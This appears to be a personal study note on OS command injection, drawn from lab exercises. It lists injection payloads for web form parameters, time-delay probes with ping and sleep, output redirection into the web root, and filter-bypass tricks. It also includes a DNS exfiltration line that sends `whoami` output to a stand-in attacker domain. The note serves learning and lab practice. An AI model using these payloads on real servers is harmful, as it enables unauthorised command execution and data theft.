to execute operating system (OS) commands on the server.

the attacker extends the default functionality of a vulnerable
application, causing it to pass commands to the system shell.

sometimes, you might need to add space after the injected code. 
## basic

`productId=2&storeId=1`

Solutions:
  * `productId=2&ehco$(whoami)&&storeId=1` URL encoded
  * `productId=2&storeId=1|whoami`

## more info

Purpose of command 	Linux 	Windows
Name of current user 	whoami 	whoami
Operating system 	uname -a 	ver
Network configuration 	ifconfig 	ipconfig /all
Network connections 	netstat -an 	netstat -an
Running processes 	ps -ef 	tasklist

## blind command injection

the application doesn't return the output of the command in it's http response.

EX: [[pwn.college_web_security#CMDi 5]]

### detection by delay

trigger a *time delay*, confirm the command execution based on the response time.

`ping` is useful for this.


`name=test&email=test%40test<& ping -c 10 127.0.0.1 &>&subject=test&message=test`
,URL encoded

the payload could be `||ping+-c+10+127.0.0.1||` or `& sleep+10 &`.

test every field, to check if it could be executed.

### exploit by redirecting output

output from the injected command into a file within the *web root* that you can
then retrieve using the browser.

`& whoami > /var/www/static/whoami.txt &`

`name=test&email=test%40test[& whoami > /var/www/images/123 &]&subject=test&message=test`

### out-of-band techniques

trigger a *network interaction* with the system.

`& nslookup kgji2ohoyw.web-attacker.com &` causes a DNS lookup then monitor to
see if the lookup happen.

also use this trick to exfiltrate data:
``
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
``
## command separators, allowing commands to be chained together

* &
* &&
* |
* ||

only on Unix-based: `;`, Newline (`0x0a` or `\n`)

Inline execution: inside backticks or `$()`

#### bypass filter

replacing characters with `.repalce()`:

use `%0A` which will be interpreted as newline. [[pwn.college_web_security#CMDi 6]]

sometimes, you might need to add space after the injected code. [[natas#natas 29]]

also `%00` is useful in these situations. `%00` is the URL-encoded
rpresentation of the null byte.